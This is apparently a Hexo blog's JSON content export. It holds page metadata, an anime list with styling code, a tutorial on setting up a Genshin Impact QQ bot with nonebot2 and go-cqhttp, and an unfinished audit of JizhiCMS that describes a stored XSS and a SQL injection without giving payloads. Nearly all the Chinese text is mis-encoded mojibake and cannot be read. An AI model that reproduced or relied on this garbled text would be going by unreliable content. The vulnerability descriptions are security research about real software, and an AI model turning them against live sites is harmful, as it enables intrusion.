{"meta":{"title":"Troy3e","subtitle":null,"description":null,"author":"Troye","url":""},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[ã•ãã‚‰è˜ã®hojun] ä¸&nbsp; Mashiro&nbsp; ï¼ˆ çœŸï¼ˆã¾ï¼‰ç™½ï¼ˆã—ã‚ï¼‰ ï¼‰ å¯¹è¯ä¸­... bot_ui_ini()","keywords":"å…³äº"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"categories","date":"2019-11-22T03:22:38.000Z","updated":"2019-11-22T03:23:51.477Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"å¿µä¸¤å¥è¯— å™åˆ«æ¢¦ã€æ‰¬å·ä¸€è§‰ã€‚ ã€å®‹ä»£ã€‘å´æ–‡è‹±ã€Šå¤œæ¸¸å®«Â·äººå»è¥¿æ¥¼é›æ³ã€‹","keywords":"ç•™è¨€æ¿"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"ç›´æ¥ä¸‹è½½ or æ‰«ç ä¸‹è½½ï¼š","keywords":"Androidå®¢æˆ·ç«¯"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"è°¢è°¢é¥²ä¸»äº†å–µ~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakuraä¸»é¢˜balabala","keywords":"Labå®éªŒå®¤"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-12-05T14:46:35.710Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"å–œæ¬¢çš„éŸ³ä¹"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"å‹äººå¸"},{"title":"photo","date":"2019-11-22T09:24:55.000Z","updated":"2019-11-22T09:24:55.430Z","comments":true,"path":"photo/index.html","permalink":"/photo/index.html","excerpt":"","text":""},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2019-11-16T09:29:49.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexoä¸»é¢˜Sakuraä¿®æ”¹è‡ªWordPressä¸»é¢˜Sakuraï¼Œæ„Ÿè°¢åŸä½œè€…Mashiro","keywords":"Hexo ä¸»é¢˜ Sakura ğŸŒ¸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2019-11-16T09:29:49.000Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: 'æ”¾é€æ—¶é—´: 2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: '2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} ç•ªç»„è®¡åˆ’ è¿™é‡Œå°†æ˜¯æ°¸è¿œçš„å›å¿† window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} æ”¾é€æ—¶é—´: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"Bç«™"},{"title":"welfare","date":"2019-11-22T09:25:13.000Z","updated":"2019-11-22T09:25:13.585Z","comments":true,"path":"welfare/index.html","permalink":"/welfare/index.html","excerpt":"","text":""}],"posts":[{"title":"åŸºäºnonebot2å’Œgo-cqhttpçš„åŸç¥æœºå™¨äººå®ç°åŠå¼€å‘","slug":"åŸºäºnonebot2å’Œgo-cqhttpçš„åŸç¥æœºå™¨äººå®ç°åŠå¼€å‘","date":"2021-10-31T02:08:46.000Z","updated":"2021-10-31T03:34:30.597Z","comments":true,"path":"2021/10/31/åŸºäºnonebot2å’Œgo-cqhttpçš„åŸç¥æœºå™¨äººå®ç°åŠå¼€å‘/","link":"","permalink":"/2021/10/31/åŸºäºnonebot2å’Œgo-cqhttpçš„åŸç¥æœºå™¨äººå®ç°åŠå¼€å‘/","excerpt":"","text":"å‰è¨€è¿™å‡ å¤©åˆè¢«æœ‹å‹æ‹‰å›å»ç©åŸç¥ï¼Œæ‰“äº†ä¸€å‘¨ç»ˆäºæ‰“çš„å·®ä¸å¤šäº†ï¼Œå¯å®¡è®¡å’Œsrcæå¾—å°‘äº†ã€‚ä½†ä¹Ÿä¸èƒ½ä¸å­¦ä¹ å•Šï¼æ‰€ä»¥å°±æäº†ä¸ªåŸç¥botã€‚æ‘¸äº†ï¼Œä½†æ²¡å®Œå…¨æ‘¸ã€‚ æ­å»ºé¡¹ç›®åœ°å€ï¼šhttps://github.com/H-K-Y/Genshin_Impact_bot python3ç¯å¢ƒé¦–å…ˆå‡†å¤‡å¥½python&gt;=3.7çš„ç‰ˆæœ¬ï¼Œå¹¶ç¡®ä¿pip3ï¼ˆpipæŒ‡å‘py3ä¹Ÿè¡Œï¼‰ä½¿ç”¨æ²¡æœ‰é—®é¢˜ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å¦‚æœè¿™ä¸€éƒ¨åˆ†å‡ºç°é”™è¯¯ï¼Œè¯·ä¼˜å…ˆè§£å†³ã€‚ nonebot2å®‰è£…1ã€å®‰è£…nonebot2åŠä¾èµ–å®˜æ–¹ç»™çš„æ•™ç¨‹æ˜¯è¿™æ ·çš„ï¼š ä½†å®é™…ä¸Šå°±2021å¹´10æœˆ31æ—¥è¿™ä¸€å¤©æ¥è¯´ï¼Œä¸èƒ½è¿™ä¹ˆè£…ã€‚å› ä¸ºpipè£…çš„nonebotä¼¼ä¹ä¸æ˜¯æœ€æ–°çš„ï¼Œæˆ‘åœ¨æ‰§è¡Œçš„æ—¶å€™ä¸€ç›´æŠ¥é”™ã€‚å¦‚æœä½ åœ¨åé¢ä¹Ÿé‡åˆ°importçš„å„ç§æŠ¥é”™ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹æˆ‘çš„è§£å†³æ–¹æ¡ˆï¼š pip install nb-cli pip uninstall nonebot git clone https://github.com/nonebot/nonebot2.git cd nonebot2 pip install . cd /usr/local/src/python37/lib/python3.7/site-packages //æ ¹æ®ä½ python3çš„ç›®å½•ä¿®æ”¹ ls å¦‚æœéƒ½è£…ä¸Šäº†ï¼Œè¿™ä¸€æ­¥å°±æˆåŠŸäº†ã€‚å¦‚æœè¿˜ä¼šæŠ¥importçš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯ä¾èµ–çš„é—®é¢˜ï¼Œå°è¯•pip install xxå³å¯ã€‚è¿™é‡Œè¿˜å¯èƒ½ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚æ¯”å¦‚ä½ æ‰§è¡Œäº†è¿™æ ·ä¸€æ¡å‘½ä»¤ï¼š pip install nonebot-adapter-cqhttp å®ƒä¼šæç¤ºä½ already satisfiedï¼Œä½†æ˜¯è¿™site-packagesä¸‹åªæœ‰nonebot_adapter_cqhttp-2.0.0a16.dist-infoè€Œæ²¡æœ‰nonebot_adapter_cqhttpã€‚äºæ˜¯æ‰§è¡Œpython3 bot.pyå°±ä¼šè«åå¥‡å¦™çš„æŠ¥é”™ã€‚ è¿™ä¸ªé—®é¢˜å‡ºç°çš„åŸå› æ˜¯åœ¨ä¹‹å‰å®‰è£…nb-cliæ—¶ï¼Œè¿™ä¸ªcqhttpé€‚é…å™¨è¢«ä¸€èµ·è£…è¿›å®ƒçš„ç›®å½•äº†ï¼Œæ‰€ä»¥ç³»ç»Ÿæ‰¾ä¸åˆ°ï¼ˆæ‰€ä»¥è¿™ä¸ªnb-clié›†æˆåœ¨ä¸€èµ·çœŸçš„å…¨æ˜¯é—®é¢˜ï¼Œå»ºè®®åˆ†å¼€è£…ï¼‰ã€‚è§£å†³æ–¹æ³•ä¸ºï¼Œæ‰‹åŠ¨åˆ›å»ºnonebot-adapter-cqhttpç›®å½•ï¼ŒæŠŠ/usr/local/src/python37/lib/python3.7/site-packages/nonebot/adapters/cqhttpä¸‹çš„å†…å®¹å¤åˆ¶è¿›æ¥å³å¯ã€‚åˆ«çš„ä¸œè¥¿æŠ¥é”™ä¹Ÿå¯ä»¥ç”¨æ­¤æ–¹æ³•å°è¯•è§£å†³ã€‚ 2ã€åˆ›å»ºnoneboté¡¹ç›® python3 -m nb_cliï¼Œç„¶åé€‰æ‹©åˆ›å»ºæ–°é¡¹ç›®ã€‚ [?] Project Name: GS_bot æ³¨ï¼šåå­—ï¼Œéšä¾¿å¡«å³å¯ [?] Where to store the plugin? &gt; In a &quot;genshinimpact_bot&quot; folder &gt; In a src folder æ³¨ï¼šé€‰æ‹©æ’ä»¶æ”¾ç½®ç›®å½•ï¼Œé”®ç›˜â†‘â†“é€‰æ‹©ï¼Œå›è½¦ç¡®è®¤ï¼Œè¿™é‡Œé€‰ç¬¬äºŒä¸ªIn a src folder [?] Load Nonebot Builtin Plugin? (y/N) æ³¨ï¼šåŠ è½½Nonebot2å†…ç½®æ’ä»¶ï¼Œå›è½¦è·³è¿‡å³å¯ [?] which adapter(s) would you like to use?(Use â†‘ and â†“ to moveï¼ŒSpace to selectï¼ŒEnter to submit) &gt; â— cqhttp o ding o mirai o feishu æ³¨ï¼šä¸Šä¸‹ç§»åŠ¨é€‰æ‹©æ¡†ï¼Œç©ºæ ¼é€‰ä¸­ï¼Œå›è½¦ç¡®è®¤ 3ã€å®‰è£…GenshinImpact_Bot cd GS_bot # åˆšæ‰åˆ›å»ºçš„ç›®å½• git clone -b nonebot2 https://github.com/H-K-Y/Genshin_Impact_bot.git 3ã€ç¼–è¾‘å¯åŠ¨æ–‡ä»¶ vi bot.py åŠ å…¥å¦‚ä¸‹ä»£ç  nonebot.load_plugins(&quot;Genshin_Impact_bot&quot;) go-cqhttpå®‰è£…åŠé…ç½®1ã€ä¸‹è½½go-cqhttpè¿™é‡Œç»å¯¹ä¸èƒ½ä¸‹è½½æ•™ç¨‹é‡Œé‚£ä¸ªï¼Œå› ä¸ºé‚£ä¸ªè€ç‰ˆæœ¬ä¸æ”¯æŒæ‰«ç ç™»å½•ï¼Œç°åœ¨txé£æ§ä¸¥æ ¼ï¼Œåªèƒ½æ‰«ç æ‰èƒ½ç™»è¿›å»ã€‚ æ‰¾ä¸€ä¸ªç›®å½•ï¼ˆæœ€å¥½å’Œä¸Šé¢GS_botåŒçº§ï¼Œè¿™æ ·æ“ä½œèµ·æ¥æ–¹ä¾¿ï¼‰ wget https://github.com/Mrs4s/go-cqhttp/releases/download/v1.0.0-beta7-fix2/go-cqhttp_1.0.0-beta7-fix2_linux_amd64.deb dpkg -i go-cqhttp_1.0.0-beta7-fix2_linux_amd64.deb mkdir qq cd qq go-cqhttp è¾“å…¥æ•°å­—3ï¼Œä¹Ÿå°±æ˜¯åå‘è¿æ¥é‚£ä¸ªï¼Œå›è½¦ã€‚ 2ã€é…ç½®go-cqhttp vi config.hjson éœ€è¦ä¿®æ”¹çš„æ•°æ® account: # è´¦å·ç›¸å…³ uin: 1233456 # QQè´¦å· password: &#39;å¯†ç &#39; # å¯†ç ä¸ºç©ºæ—¶ä½¿ç”¨æ‰«ç ç™»å½• servers: - ws-reverse: universal: ws://127.0.0.1:8080/cqhttp/ws è¿™é‡Œæˆ‘çš„ç¼©è¿›æœ‰ç‚¹é—®é¢˜ï¼Œserversé‚£é‡Œè¯·å‚è€ƒ æ ¼å¼æœ‰ä¸€ç‚¹ä¸å¯¹å°±ä¼šæŠ¥é”™ã€‚æ³¨ï¼šuniversalä¸‹ä¸‰ä¸ªæœ‰ä¸ªé‡æ–°è¿æ¥çš„è®¾ç½®ï¼Œå¥½åƒé»˜è®¤æ˜¯3000ï¼Œä¸è¦ä¿®æ”¹ï¼Œå¦‚æœæ²¡æœ‰å°±æ·»ä¸Šã€‚ è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è¿è¡Œã€‚æˆ‘åœ¨è¿™é‡Œé‡åˆ°çš„é—®é¢˜å°±æ˜¯time outï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯åå‘è¿æ¥å‡ºäº†é—®é¢˜ï¼Œåæ¥å‘ç°èƒ½æ”¶åˆ°æ¶ˆæ¯ï¼Œæ‰€ä»¥ä¸ç”¨ç®¡ä»–ï¼Œå¦‚æœå¼‚å¸¸é€€å‡ºäº†å†è¯•å‡ æ¬¡å³å¯ã€‚ é…ç½®nonebot2æ‰¾åˆ°åˆšåˆšnb_cliåˆ›å»ºçš„ç›®å½• vi ~/GS_bot/.env.dev ä¿®æ”¹ HOST=127.0.0.1 # é…ç½® NoneBot ç›‘å¬çš„ IP/ä¸»æœºå PORT=8080 # é…ç½® NoneBot ç›‘å¬çš„ç«¯å£ SUPERUSERS=[&quot;123456&quot;] # é…ç½® NoneBot è¶…çº§ç”¨æˆ· NICKNAME=[&quot;bot&quot;, &quot;æ´¾è’™&quot;] # é…ç½®æœºå™¨äººçš„æ˜µç§° COMMAND_START=[&quot;/&quot;, &quot;&quot;] # é…ç½®å‘½ä»¤èµ·å§‹å­—ç¬¦ NICKNAMEå¡«å†™åï¼Œå‘é€xxx æ“ä½œç­‰åŒäºç›´æ¥@æœºå™¨äººï¼ˆä¾‹å¦‚æŠ½å¡åŠŸèƒ½éœ€è¦@æœºå™¨äººï¼Œè€Œæ·»åŠ nicknameä¹‹åå¯ä»¥ç›´æ¥å‘é€æ´¾è’™ åŸä¹‹äº•è¿™æ ·æ¥è§¦å‘å‘½ä»¤ è¿è¡Œ1ã€è¿è¡Œgo-cqhttp cd ~/qq nohup go-cqhttp &amp; æˆ‘è¿™é‡Œä¸æ˜¯ç¬¬ä¸€æ¬¡è¿è¡Œæ‰€ä»¥ç›´æ¥æŒ‚äº†åå°ï¼Œå¦‚æœä½ æ˜¯ç¬¬ä¸€æ¬¡æ‰“å¼€è¯·æ‰§è¡Œ go-cqhttp 2ã€è¿è¡Œnonebot2 cd ~/GS_bot nohup python3 bot.py &amp; è‡³æ­¤åŸç¥botå·²ç»å¼€å§‹æ­£å¸¸è¿è¡Œ æµ‹è¯•ï¼š å¦™å•Šã€‚å‘½ä»¤ï¼šhttps://github.com/H-K-Y/Genshin_Impact_bot/wiki/%E5%91%BD%E4%BB%A4æˆ–è¾“å…¥åŸç¥å¸®åŠ© æ’ä»¶å¼€å‘è¿™ä¸ªbotç›®å‰åŠŸèƒ½æ˜¯å¾ˆæœ‰é™çš„ï¼Œæ¯”å¦‚ä¸èƒ½æŸ¥è¯¢uidã€‚ éº»äº†è¿™ä¸ªuidçœ‹äº†ä¸‹æ¯ä¸ªå·æ¯å¤©åªèƒ½æŸ¥30æ¬¡ï¼Œç®—äº†ä¸æäº†ï¼Œåæ­£ä¹Ÿæ˜¯å‡ ä¸ªæœ‹å‹ç”¨ç€ç©ã€‚ è‡ªå®šä¹‰çš„ä¸œè¥¿è¿‡æ®µæ—¶é—´å†æã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"æè‡´CMSæ¼æ´æ•´åˆä¸åˆ†æ","slug":"æè‡´CMSæ¼æ´æ•´åˆä¸åˆ†æ","date":"2021-10-30T09:27:49.000Z","updated":"2021-10-30T09:02:02.379Z","comments":true,"path":"2021/10/30/æè‡´CMSæ¼æ´æ•´åˆä¸åˆ†æ/","link":"","permalink":"/2021/10/30/æè‡´CMSæ¼æ´æ•´åˆä¸åˆ†æ/","excerpt":"","text":"é—²æ¥æ— äº‹ï¼Œéšä¾¿æ‰¾ä¸ªCMSå®¡ä¸€å®¡ã€‚ é“¾æ¥ï¼šhttps://github.com/Cherry-toto/jizhicms/releases/ éšç¼˜æ›´æ–°ã€‚ å‰è¨€ è‹¥å‡ºç°é¡µé¢404çš„ï¼Œè¯·è®¾ç½®ä¼ªé™æ€ï¼šhttps://www.kancloud.cn/toto/jizhicms/1540682 v1.6.7æºç ï¼šhttps://codeload.github.com/Cherry-toto/jizhicms/zip/refs/tags/v1.6.7 ä¸€ã€å­˜å‚¨å‹XSSåœ¨å‘å¸ƒæ–‡ç« æ ‡é¢˜æ’å…¥æ¶æ„ä»£ç  åå°ç®¡ç†å‘˜æŸ¥çœ‹å†…å®¹ ç›¸å…³ä»£ç åœ¨/Home/c/UserController.php ç»è¿‡htmlå®ä½“åŒ–å’Œè½¬ä¹‰ï¼Œçœ‹ä¸Šå»ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ã€‚ ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰å¤„ç†titleï¼Œæ‰€ä»¥ä¼šè§¦å‘ã€‚ äºŒã€é¦–é¡µsqlæ³¨å…¥è°ƒè¯•å‡ºäº†ç‚¹å°é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹è§£å†³æ–¹æ¡ˆï¼ˆå…¶å®æ˜¯æˆ‘ä¹‹å‰å†™çš„é‚£ç¯‡æ–‡ç« æœ‰ç‚¹å°é—®é¢˜ï¼Œå¸Œæœ›æ²¡äººçœ‹åˆ°ã€‚ã€‚ã€‚ï¼‰ï¼šhttps://cloud.tencent.com/developer/news/411805 ä»¥åŠè°ƒè¯•æ—¶è¶…æ—¶500çš„è§£å†³æ–¹æ³•ï¼ˆéœ€é‡å¯webæœåŠ¡ï¼‰ï¼šhttps://blog.csdn.net/qq_36505844/article/details/105712135 å…³é”®ä»£ç åœ¨HomeController.phpçš„jizhi()é‡Œ ä¸‹ä¸ªæ–­ç‚¹è·Ÿä¸€ä¸‹ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ„é€ çš„æ¶æ„ä»£ç è¢«ä¼ å…¥findï¼Œç»§ç»­è·Ÿè¿› FrPHP\\lib\\Modelé‡Œçš„findæ–¹æ³• å¯ä»¥çœ‹åˆ°æ¶æ„ä»£ç å·²ç»è¢«æ’å…¥ åŸç†å¦‚ä¸‹ æœ€åæŠ¥é”™ä¿¡æ¯é€šè¿‡\\Home\\c\\ErrorController.phpä¸‹è¿›è¡Œè¾“å‡ºã€‚ æ¼æ´äº§ç”ŸåŸå› 